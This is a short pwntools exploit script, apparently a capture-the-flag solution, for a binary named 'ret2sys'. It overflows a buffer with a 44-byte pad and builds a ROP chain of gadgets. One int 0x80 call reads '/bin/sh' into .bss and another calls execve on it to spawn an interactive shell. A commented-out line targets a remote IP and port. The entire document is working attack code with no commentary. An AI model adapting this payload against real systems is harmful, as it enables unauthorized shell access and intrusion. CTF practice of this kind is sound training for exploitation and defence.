from pwn import *
sh = process("./ret2sys")
#context.log_level = 'debug'
#context.terminal = ['tmux', 'splitw', '-h']
#sh = remote("120.79.17.251",10005)
pop_eax = 0x080bb2c6 
pop_edx_ecx_ebx = 0x0806ecb0
bss = 0x080eb000
int_0x80 = 0x08049421
payload = b"a"*44
payload += p32(pop_eax)+p32(0x3)
payload += p32(pop_edx_ecx_ebx)+p32(0x10)+p32(bss)+p32(0)
payload += p32(int_0x80)
payload += p32(pop_eax)+p32(0xb)
payload += p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bss)
payload += p32(int_0x80)
sh.sendline(payload)
sleep(1)
bin_sh = b"/bin/sh\x00"
sh.sendline(bin_sh)
sh.interactive()
